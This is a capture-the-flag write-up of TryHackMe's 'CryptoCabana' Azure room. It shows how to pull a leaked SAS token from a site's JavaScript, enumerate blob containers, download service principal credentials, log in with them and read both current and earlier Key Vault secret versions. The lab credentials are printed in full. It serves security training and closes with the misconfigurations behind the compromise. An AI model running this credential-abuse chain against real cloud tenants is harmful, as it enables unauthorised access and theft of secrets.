Written By Aryan Giri

**Room:** CryptoCabana  
**Category:** Cloud  
**Difficulty:** Medium  
**Room URL:** https://tryhackme.com/room/hh-cryptocabana-f81cac95

## Scenario

Ponzi trusted the CryptoCabana backup kiosk to securely store his cryptocurrency seed phrase. The website confidently claimed:

> "Backed up. Sleep easy."

Unfortunately, the application exposed far more trust than intended. Our goal is to investigate what the kiosk exposes publicly, abuse that trust, discover hidden Azure Storage containers, recover service principal credentials, and ultimately retrieve secrets from Azure Key Vault.

---

## Skills Learned

- Azure Storage Account enumeration
- Azure Blob Container discovery
- SAS Token abuse
- Azure CLI basics
- Azure Service Principal authentication
- Azure Key Vault enumeration
- Secret version history abuse

---

# Initial Recon

The room provides the following target.

```
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

Open the website.

<img width="1262" height="752" alt="Screenshot 2026-08-06 090426" src="https://github.com/user-attachments/assets/ef5fb833-5cc7-4336-a940-e9ca36dd4efa" />


The page looks like a normal backup portal.

Since this is a client-side web application, the first step is inspecting the JavaScript.

Open:

- Firefox Developer Tools
- Debugger (or Sources)
- `app.js`

Inside `app.js` we immediately discover Azure Storage credentials embedded directly inside the frontend.

<img width="1060" height="740" alt="Screenshot 2026-08-06 090505" src="https://github.com/user-attachments/assets/32d96cf3-f506-4838-8671-578462d705ce" />


The application leaks:

- Storage Account
- Container name
- SAS Token

This means every visitor receives authenticated access to Azure Storage.

---

# Configure Azure CLI

Although TryHackMe provides Azure Cloud Shell, I used the Azure CLI locally on Kali Linux.

Installation is straightforward.

```bash
sudo apt install azure-cli
```

Verify installation.

```bash
az --version
```

Now export the leaked credentials.

```bash
export STORAGE_ACCOUNT="cryptocabanaf5scjagc"
export BACKUPS_CONTAINER="backups"
export BACKUP_SAS="?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

<img width="1376" height="180" alt="Screenshot 2026-08-06 090821" src="https://github.com/user-attachments/assets/dc56c4cb-6d8f-48e9-9a1e-8dd219407273" />


---

# Enumerating Storage Containers

Instead of trusting the application, enumerate the entire Storage Account.

```bash
az storage container list \
    --account-name $STORAGE_ACCOUNT \
    --sas-token "$BACKUP_SAS" \
    -o table
```

<img width="874" height="165" alt="Screenshot 2026-08-06 090944" src="https://github.com/user-attachments/assets/c758763b-6bbe-4e9b-bbca-521d16f7357f" />


Three containers are returned.

The room description contains an important clue:

> He'd backed his seed phrase up weeks ago, into the CryptoCabana kiosk's vault.

That immediately suggests investigating the **vault** container first.

---

# Enumerating the Vault

List every blob stored inside.

```bash
az storage blob list \
    --container-name vault \
    --account-name $STORAGE_ACCOUNT \
    --sas-token "$BACKUP_SAS" \
    -o table
```

<img width="1031" height="112" alt="Screenshot 2026-08-06 091224" src="https://github.com/user-attachments/assets/6909036f-711d-4bc3-9cf5-4a973a30091c" />


Two interesting files appear:

- `backup-service-account.json`
- `seed_phrase.txt`

Download both.

```bash
az storage blob download \
    --container-name vault \
    --name backup-service-account.json \
    --file backup.json \
    --account-name $STORAGE_ACCOUNT \
    --sas-token "$BACKUP_SAS"
```

<img width="1342" height="74" alt="Screenshot 2026-08-06 091445" src="https://github.com/user-attachments/assets/71ebeb4b-6b88-494d-89d4-9dc7745f860b" />


```bash
az storage blob download \
    --container-name vault \
    --name seed_phrase.txt \
    --file seed.txt \
    --account-name $STORAGE_ACCOUNT \
    --sas-token "$BACKUP_SAS"
```

<img width="1213" height="105" alt="Screenshot 2026-08-06 091605" src="https://github.com/user-attachments/assets/9c86695b-bc13-4d4c-b606-68f3c03497c1" />


Verify the downloaded files.

```bash
ls
```

<img width="350" height="84" alt="Screenshot 2026-08-06 091622" src="https://github.com/user-attachments/assets/2ae32311-d045-4e6c-9c38-117d05bf3f44" />


---

# Inspecting the Files

Display both files.

```bash
cat backup.json
```

```bash
cat seed.txt
```

The JSON file contains Azure Service Principal credentials.

```
client_id: dbcf2923-e4eb-4b72-a0a4-688aa1185cf5

client_secret: UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg

tenant_id: 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c

key_vault_name: ccabana-kv-f5scjagc
```

The second file contains text related to the challenge, but the real prize is the service principal.

<img width="1908" height="154" alt="Screenshot 2026-08-06 091658" src="https://github.com/user-attachments/assets/1d259f05-7b79-4c55-842c-1956f4fd5220" />


---

# Configure the Service Principal

Export the credentials.

```bash
export CLIENT_ID="dbcf2923-e4eb-4b72-a0a4-688aa1185cf5"
export CLIENT_SECRET="UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg"
export TENANT_ID="8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
export KV_NAME="ccabana-kv-f5scjagc"
```

<img width="554" height="197" alt="Screenshot 2026-08-06 091907" src="https://github.com/user-attachments/assets/4f7e96c9-0cd3-4cf9-a01a-1ad7e63a3a56" />

Authenticate as the Service Principal.

```bash
az login \
    --service-principal \
    -u $CLIENT_ID \
    -p $CLIENT_SECRET \
    --tenant $TENANT_ID
```

<img width="718" height="326" alt="Screenshot 2026-08-06 091937" src="https://github.com/user-attachments/assets/7e861c25-6f15-4aa2-9408-f69f36fe713d" />


Authentication succeeds.

---

# Enumerating Azure Key Vault

List every secret stored inside the Key Vault.

```bash
az keyvault secret list \
    --vault-name $KV_NAME \
    -o table
```

<img width="1089" height="164" alt="Screenshot 2026-08-06 092115" src="https://github.com/user-attachments/assets/543d85ac-e442-479c-b7d1-9a1dbc3a2c75" />


Several secret shards are visible.

However, one of them appears to have been rotated.

This matches another clue from Mia.

> If a value looks freshly rotated, ask yourself what it looked like five minutes before that.

---

# Recovering Previous Secret Versions

Retrieve the first shard.

```bash
az keyvault secret show \
    --vault-name $KV_NAME \
    --name key-shard-1 \
    --query value \
    -o tsv
```

Retrieve the third shard.

```bash
az keyvault secret show \
    --vault-name $KV_NAME \
    --name key-shard-3 \
    --query value \
    -o tsv
```

The second shard has been rotated.

Azure Key Vault stores historical versions of secrets.

List every version.

```bash
az keyvault secret list-versions \
    --vault-name $KV_NAME \
    --name key-shard-2
```

After identifying the previous version ID, retrieve it.

```bash
az keyvault secret show \
    --vault-name $KV_NAME \
    --name key-shard-2 \
    --version 3d6492d2c6f74123bc754a9ded22b2a0 \
    --query value \
    -o tsv
```

<img width="787" height="144" alt="Screenshot 2026-08-06 095743" src="https://github.com/user-attachments/assets/2cea4c80-912f-4681-a1cb-94d8d88d8d70" />
<img width="915" height="646" alt="Screenshot 2026-08-06 095816" src="https://github.com/user-attachments/assets/e9cdd9fe-5924-45eb-b365-cf27420e77cb" />
<img width="1106" height="81" alt="Screenshot 2026-08-06 095857" src="https://github.com/user-attachments/assets/773b7d2a-d2e0-4e5c-b984-e6b40b2af195" />



Combining all three secret shards reconstructs the challenge flag.

```text
<!-- Flag intentionally hidden to comply with TryHackMe writeup rules. -->
```

---

# Attack Chain

```
Public JavaScript
        │
        ▼
Leaked Azure SAS Token
        │
        ▼
Enumerate Storage Account
        │
        ▼
Hidden Blob Container
        │
        ▼
Download Service Principal Credentials
        │
        ▼
Authenticate to Azure
        │
        ▼
Enumerate Azure Key Vault
        │
        ▼
Recover Previous Secret Versions
        │
        ▼
Reconstruct Flag
```

---

# What Went Wrong?

Several security issues combined to make the compromise possible.

- Azure Storage SAS token exposed inside client-side JavaScript
- Excessive permissions granted to the SAS token
- Hidden containers were still accessible through Storage enumeration
- Service Principal credentials stored inside Blob Storage
- Service Principal permitted Key Vault access
- Previous Key Vault secret versions remained accessible

Each issue alone is risky, but together they create a complete privilege escalation chain from a public website to sensitive cloud secrets.

---

# Conclusion

CryptoCabana demonstrates how cloud misconfigurations often chain together rather than existing in isolation. A publicly exposed SAS token led to unrestricted Storage enumeration, which exposed privileged Azure credentials. Those credentials granted access to Azure Key Vault, where historical secret versions allowed recovery of previously rotated values.

The room provides an excellent introduction to Azure Storage, Service Principals, Key Vault, and the security implications of trusting client-side applications with sensitive cloud credentials.
